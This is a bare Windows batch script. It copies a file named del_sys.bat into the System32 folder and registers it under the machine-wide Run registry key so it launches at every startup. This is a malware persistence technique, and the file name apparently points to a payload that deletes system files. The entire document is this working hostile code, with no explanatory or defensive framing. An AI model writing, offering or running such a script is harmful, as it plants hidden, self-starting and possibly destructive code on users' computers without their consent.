@echo off
copy del_sys.bat "C:\Windows\System32\del_sys.bat"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v del_sys /t REG_SZ /d "C:\Windows\System32\del_sys.bat" /f